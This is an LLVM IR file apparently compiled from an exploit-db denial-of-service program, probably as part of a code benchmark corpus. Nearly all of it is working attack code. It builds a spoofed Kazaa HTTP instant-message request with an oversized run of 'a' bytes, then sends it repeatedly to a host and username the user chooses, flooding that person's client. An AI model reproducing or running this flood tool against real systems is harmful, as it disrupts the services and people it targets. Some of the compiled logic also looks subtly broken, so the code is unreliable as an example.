; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_21653.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_21653.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i8, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [96 x i8] c"usage: %s <hostname> <(this*4026) bytes per message> <username_of_target> <number_of_messages>\0A\00", align 1
@.str.1 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@PORT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [261 x i8] c"GET /.message HTTP/1.1\0AHost: 68.10.112.148:1214\0AUserAgent: KazaaClient Jan 18 2002 18:53:21\0AX-Kazaa-Username: 31337h4x0r\0AX-Kazaa-Network: KaZaA\0AX-Kazaa-IP: %d:1214\0AX-Kazaa-SupernodeIP: %d:1214\0AConnection:  open\0AX-Kazaa-IMTo: %s@KaZaA\0AX-Kazaa-IMType: user_text\0A\00", align 1
@.str.3 = private unnamed_addr constant [20 x i8] c"X-Kazaa-IMData: %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [11 x i8] c"\0D\0A\0D\0A\0D\0A\0D\0A\0D\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [34 x i8] c"done preparing packet... sending\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.8 = private unnamed_addr constant [20 x i8] c"sending %d message\0A\00", align 1
@.str.9 = private unnamed_addr constant [37 x i8] c"\0A%d out of %d attempted got through\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca [4026 x i8], align 16
  %13 = alloca [5000 x i8], align 16
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %18 = getelementptr inbounds [4026 x i8], [4026 x i8]* %12, i64 0, i64 0
  %19 = call i32 @memset(i8* %18, i8 signext 97, i32 4026)
  %20 = getelementptr inbounds [4026 x i8], [4026 x i8]* %12, i64 0, i64 4025
  store i8 0, i8* %20, align 1
  %21 = call i32 @time(i32* null)
  %22 = call i32 @srand(i32 %21)
  %23 = load i32, i32* %4, align 4
  %24 = icmp slt i32 %23, 5
  br i1 %24, label %25, label %32

25:                                               ; preds = %2
  %26 = load i32, i32* @stderr, align 4
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 (i32, i8*, ...) @fprintf(i32 %26, i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str, i64 0, i64 0), i8* %29)
  %31 = call i32 @exit(i32 1) #4
  unreachable

32:                                               ; preds = %2
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call %struct.hostent* @gethostbyname(i8* %35)
  store %struct.hostent* %36, %struct.hostent** %10, align 8
  %37 = icmp eq %struct.hostent* %36, null
  br i1 %37, label %38, label %41

38:                                               ; preds = %32
  %39 = call i32 @perror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0))
  %40 = call i32 @exit(i32 1) #4
  unreachable

41:                                               ; preds = %32
  %42 = load i32, i32* @AF_INET, align 4
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 3
  store i32 %42, i32* %43, align 4
  %44 = load i32, i32* @PORT, align 4
  %45 = call i32 @htons(i32 %44)
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %45, i32* %46, align 4
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %48 = load %struct.hostent*, %struct.hostent** %10, align 8
  %49 = getelementptr inbounds %struct.hostent, %struct.hostent* %48, i32 0, i32 0
  %50 = load i64, i64* %49, align 8
  %51 = inttoptr i64 %50 to %struct.in_addr*
  %52 = bitcast %struct.in_addr* %47 to i8*
  %53 = bitcast %struct.in_addr* %51 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %52, i8* align 4 %53, i64 4, i1 false)
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  %55 = call i32 @memset(i8* %54, i8 signext 0, i32 8)
  %56 = load i8**, i8*** %5, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 2
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 @atoi(i8* %58)
  %60 = mul nsw i32 4042, %59
  %61 = add nsw i32 %60, 280
  %62 = add nsw i32 %61, 1
  store i32 %62, i32* %16, align 4
  %63 = load i32, i32* %16, align 4
  %64 = call i64 @malloc(i32 %63)
  %65 = inttoptr i64 %64 to i8*
  store i8* %65, i8** %14, align 8
  %66 = load i8*, i8** %14, align 8
  %67 = load i32, i32* %16, align 4
  %68 = load i32, i32* %8, align 4
  %69 = load i32, i32* %8, align 4
  %70 = load i8**, i8*** %5, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 3
  %72 = load i8*, i8** %71, align 8
  %73 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %66, i32 %67, i8* getelementptr inbounds ([261 x i8], [261 x i8]* @.str.2, i64 0, i64 0), i32 %68, i32 %69, i8* %72)
  %74 = getelementptr inbounds [5000 x i8], [5000 x i8]* %13, i64 0, i64 0
  %75 = getelementptr inbounds [4026 x i8], [4026 x i8]* %12, i64 0, i64 0
  %76 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %74, i32 5000, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0), i8* %75)
  store i32 0, i32* %9, align 4
  br label %77

77:                                               ; preds = %90, %41
  %78 = load i32, i32* %9, align 4
  %79 = load i8**, i8*** %5, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 2
  %81 = load i8*, i8** %80, align 8
  %82 = call i32 @atoi(i8* %81)
  %83 = icmp slt i32 %78, %82
  br i1 %83, label %84, label %93

84:                                               ; preds = %77
  %85 = load i8*, i8** %14, align 8
  %86 = getelementptr inbounds [5000 x i8], [5000 x i8]* %13, i64 0, i64 0
  %87 = call i32 @strcat(i8* %85, i8* %86)
  %88 = load i32, i32* %9, align 4
  %89 = add nsw i32 %88, 1
  store i32 %89, i32* %9, align 4
  br label %90

90:                                               ; preds = %84
  %91 = load i32, i32* %9, align 4
  %92 = add nsw i32 %91, 1
  store i32 %92, i32* %9, align 4
  br label %77

93:                                               ; preds = %77
  %94 = load i8*, i8** %14, align 8
  %95 = call i32 @strcat(i8* %94, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i64 0, i64 0))
  %96 = load i32, i32* @stdout, align 4
  %97 = call i32 (i32, i8*, ...) @fprintf(i32 %96, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %15, align 4
  store i32 0, i32* %9, align 4
  br label %98

98:                                               ; preds = %133, %93
  %99 = load i32, i32* %15, align 4
  %100 = load i8**, i8*** %5, align 8
  %101 = getelementptr inbounds i8*, i8** %100, i64 4
  %102 = load i8*, i8** %101, align 8
  %103 = call i32 @atoi(i8* %102)
  %104 = icmp slt i32 %99, %103
  br i1 %104, label %105, label %136

105:                                              ; preds = %98
  %106 = load i32, i32* @AF_INET, align 4
  %107 = load i32, i32* @SOCK_STREAM, align 4
  %108 = call i32 @socket(i32 %106, i32 %107, i32 0)
  store i32 %108, i32* %6, align 4
  %109 = icmp eq i32 %108, -1
  br i1 %109, label %110, label %112

110:                                              ; preds = %105
  %111 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  br label %132

112:                                              ; preds = %105
  %113 = load i32, i32* %6, align 4
  %114 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %115 = call i32 @connect(i32 %113, %struct.sockaddr* %114, i32 4)
  %116 = icmp eq i32 %115, -1
  br i1 %116, label %117, label %119

117:                                              ; preds = %112
  %118 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0))
  br label %131

119:                                              ; preds = %112
  %120 = load i32, i32* %9, align 4
  %121 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.8, i64 0, i64 0), i32 %120)
  %122 = load i32, i32* %6, align 4
  %123 = load i8*, i8** %14, align 8
  %124 = load i8*, i8** %14, align 8
  %125 = call i32 @strlen(i8* %124)
  %126 = call i32 @write(i32 %122, i8* %123, i32 %125)
  %127 = load i32, i32* %9, align 4
  %128 = add nsw i32 %127, 1
  store i32 %128, i32* %9, align 4
  %129 = load i32, i32* %6, align 4
  %130 = call i32 @close(i32 %129)
  br label %131

131:                                              ; preds = %119, %117
  br label %132

132:                                              ; preds = %131, %110
  br label %133

133:                                              ; preds = %132
  %134 = load i32, i32* %15, align 4
  %135 = add nsw i32 %134, 1
  store i32 %135, i32* %15, align 4
  br label %98

136:                                              ; preds = %98
  %137 = load i32, i32* @stdout, align 4
  %138 = load i32, i32* %9, align 4
  %139 = load i32, i32* %15, align 4
  %140 = call i32 (i32, i8*, ...) @fprintf(i32 %137, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.9, i64 0, i64 0), i32 %138, i32 %139)
  %141 = load i8*, i8** %14, align 8
  %142 = call i32 @free(i8* %141)
  ret i32 0
}

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @srand(i32) #1

declare dso_local i32 @time(i32*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @htons(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @atoi(i8*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, ...) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @printf(i8*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
